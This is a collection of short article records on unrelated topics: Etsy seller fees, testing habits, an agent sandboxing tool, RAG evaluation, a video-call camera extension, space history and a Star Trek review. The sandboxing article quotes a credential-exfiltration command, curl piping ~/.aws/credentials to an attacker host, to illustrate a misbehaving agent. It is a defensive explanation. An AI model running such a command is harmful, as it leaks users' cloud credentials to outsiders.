articles.excerpt: If you sell printables, planners, templates or other digital downloads on Etsy, you've probably looked at a payout and wondered where the rest went. Listing fees, transaction fees, processing fees and…
articles.body: If you sell printables, planners, templates or other digital downloads on Etsy, you've probably looked at a payout and wondered where the rest went. Listing fees, transaction fees, processing fees and, on some orders, a 15% Offsite Ads fee all come out of the same small price. The usual advice is "just move to your own site." That's only half right. Etsy charges more because it brings buyers you didn't find yourself, and your own site brings nobody until you send people there. The better question is: for the buyers you bring yourself, where should they pay?

articles.title: You can't quiz someone into writing tests
articles.excerpt: Every course I've taken has a lesson about testing. It explains what a unit test is, has you write one into a box, marks it green, and moves on. I passed several of those lessons. I did not start writ…
articles.body: Every course I've taken has a lesson about testing. It explains what a unit test is, has you write one into a box, marks it green, and moves on. I passed several of those lessons. I did not start writing tests. The same is true of git. There's a lesson on commit messages, usually with a multiple-choice question about the imperative mood. Nobody's commit history changes because of it. That's not the courses being lazy. It's that these aren't facts, they're habits, and a habit is visible in a year of work rather than in one answer. You can quiz somebody on what a conventional commit is. You can't quiz them into writing one on a Tuesday when they're tired.

articles.title: Anthropic Sandbox Runtime: OS-Level Agent Sandboxing Without Containers
articles.excerpt: Anthropic released sandbox-runtime as a beta research preview for Claude Code. It addresses a specific problem: how do you let an agent execute arbitrary code without letting it read your SSH keys or…
articles.body: Anthropic released sandbox-runtime as a beta research preview for Claude Code. It addresses a specific problem: how do you let an agent execute arbitrary code without letting it read your SSH keys or phone home to attacker-controlled domains? The tool uses native OS sandboxing primitives (sandbox-exec on macOS, bubblewrap on Linux) plus proxy-based network filtering. No containers. No VMs. Just syscall interception and policy enforcement at the process boundary. It's trending at #5 on GitHub TypeScript with 6,591 stars because every production agent deployment faces the same question: what happens when the LLM decides to run curl attacker.com < ~/.aws/credentials ? How It Works Sandbox-runtime wraps a target process with OS-level restrictions.

articles.title: Evidence-Aware RAG Evaluation: Why Ground Truth Coverage Determines Retrieval Scores in Clinical Agent Systems
articles.excerpt: Your RAG system's retrieval scores depend on how much of your corpus you've annotated, not on retriever quality alone. A new paper from a clinical AI team demonstrates this measurement artifact in a b…
articles.body: Your RAG system's retrieval scores depend on how much of your corpus you've annotated, not on retriever quality alone. A new paper from a clinical AI team demonstrates this measurement artifact in a breast lesion management system and proposes an evidence-aware evaluation protocol that separates annotation coverage from system quality. The problem surfaces when you build evals for high-stakes agent systems. You can't exhaustively label every relevant passage in a large corpus. Your ground truth becomes a sample, and your retrieval metrics reflect that sample's completeness as much as your system's performance. The Annotation Coverage Problem Standard RAG evaluation assumes your ground truth annotations are complete.

articles.title: Spoofing the camera in Google Meet Zoom Teams and more
articles.excerpt: I saw a Telegram post about Snap, a Google Meet extension by @deniza-png. Before the call you photograph the empty room; mid-call you snap your fingers and disappear. I wanted that, plus everything el…
articles.body: I saw a Telegram post about Snap , a Google Meet extension by @deniza-png. Before the call you photograph the empty room; mid-call you snap your fingers and disappear. I wanted that, plus everything else I was missing on calls: backgrounds, masks, stickers, translated captions, a teleprompter. So I built Telepult.Web , a browser extension that sits on top of the web call and edits the camera before anyone else sees it. It started on Meet, then grew to Zoom Web, Microsoft Teams, Discord, Slack huddles and about thirty other sites. Same idea everywhere: the call page asks for a camera, the extension hands it a painted stream. Chrome Web Store Firefox Add-ons Site / try with your camera Credit where it is due: I could not find Snap’s author on every network, so I am tagging the GitHub nick.

articles.title: On this day in space! Oct. 25, 1671: Astronomer Giovanni Cassini discovers Iapetus, Saturn's 'yin-yang' moon
articles.excerpt: On Oct. 25, 1671, the Italian astronomer Giovanni Cassini discovered a new moon at Saturn! Here's why it mattered.
articles.body: On Oct. 25, 1671, the Italian astronomer Giovanni Cassini discovered a new moon at Saturn! Iapetus was the second moon anyone had ever found orbiting Saturn, and it was the first of four moons Cassini would discover at the ringed planet. The Dutch astronomer Christiaan Huygens had discovered Titan , the largest of Saturn's moons, about six years earlier. After Cassini found Iapetus, he also found the moons Rhea, Tethys and Dione. When Cassini first saw Iapetus, the moon looked like a tiny speck on the west side of Saturn. He calculated its orbit and thought he would be able to see it again on the east side of Saturn 39 days later, but it was nowhere to be seen.

articles.title: On this day in space! Oct. 24, 1946: V-2 rocket takes 1st photos of Earth from space
articles.excerpt: On October 24, 1946, a V-2 rocket captured the first-ever photo of Earth from space. Here's why it mattered.
articles.body: On October 24, 1946, a V-2 rocket captured the first-ever photo of Earth from space. While these grainy, black-and-white images might not look like much today, they were a huge deal at the time, because no one had ever seen Earth from space before. The V-2 rocket launched from the White Sands Missile Range in New Mexico. It carried a 35-millimeter motion picture camera that captured a new frame every second and a half. The rocket soared to an altitude of about 65 miles before falling back to Earth. Both the rocket and the camera were destroyed after crashing into the Earth at a speed of about 340 miles per hour. But the film survived because it was protected inside a steel case. Scientists had to drive out into the New Mexico desert to retrieve the film.

articles.title: 'Star Trek: Strange New Worlds' was afraid to say anything in season of gimmicks
articles.excerpt: The fourth season of "Star Trek: Strange New Worlds" was one giant gimmick: shoving "Trek" into as many genres as possible and often directly adapting classic films from those genres.
articles.body: It didn’t take long for fans to figure out that the fourth season of "Star Trek: Strange New Worlds" was going to be unlike any season of " Star Trek " before it. The entire season was one giant gimmick, and that gimmick was shoving "Trek" into as many genres as possible and often directly adapting classic films from those genres. You could argue that an entire season of gimmick episodes is a bold risk: putting the characters in fun, wacky situations to see how they react. It could be interesting, but the season we got never made the most of the concept. It was all so safe and paint-by-numbers, and, most importantly, it didn't have anything profound or interesting to say. That should trouble any Trekkie.
